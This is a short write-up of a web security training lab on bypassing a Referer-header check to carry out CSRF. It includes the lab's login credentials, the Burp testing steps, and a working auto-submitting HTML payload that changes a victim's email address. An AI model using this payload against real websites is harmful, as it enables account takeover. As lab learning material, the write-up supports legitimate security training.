### Lab: CSRF with broken Referer validation

This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

_____

Analysis and Exploit:

1. Logged-in as user _wiener_, changed email

2. Repeated the request via Burp Repeater without the Referrer header, returned message _400 Bad request Invalid Referer Header_

3. Same error message if request is sent with Referer Header set to a domain like _fakedomain.fake_

4. Success if right in Referer Header: right-domain.net.fakedomain.fake.  
As subdomain

4. HTML payload that add a page in the browser history to trick the browser to generates a valid referer header

```html
<html>
    <body>
        <form action="URL/my-account/change-email" method="POST">
            <input required type="email" name="email" value="yougot@hacked">
            <button type="submit">Submit</button>
        </form>
    </body>
    <script>
        history.pushState("", "", "/?URL");
        document.forms[0].submit()
    </script>
</html>
```

In an HTML document, the history.pushState() method adds an entry to the browser's session history stack.